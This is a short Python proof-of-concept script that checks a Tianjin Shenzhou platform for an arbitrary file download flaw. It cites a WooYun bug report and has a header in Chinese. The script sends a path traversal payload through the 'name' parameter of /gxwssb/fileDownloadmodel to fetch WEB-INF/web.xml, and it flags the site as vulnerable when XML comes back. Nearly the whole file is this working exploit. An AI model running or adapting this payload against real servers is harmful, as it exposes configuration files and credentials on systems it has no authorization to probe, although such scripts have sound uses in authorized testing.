#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 天津神州助平台通用型任意下载
referer: http://www.wooyun.org/bugs/wooyun-2010-087767
author: Lucifer
description: 文件/gxwssb/fileDownloadmodel中,参数name存在任意文件下载。
'''
import sys
import requests



class gxwssb_fileDownloadmodel_download_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/gxwssb/fileDownloadmodel?name=../WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                return "[+]存在天津神州助平台通用型任意下载漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = gxwssb_fileDownloadmodel_download_BaseVerify(sys.argv[1])
    testVuln.run()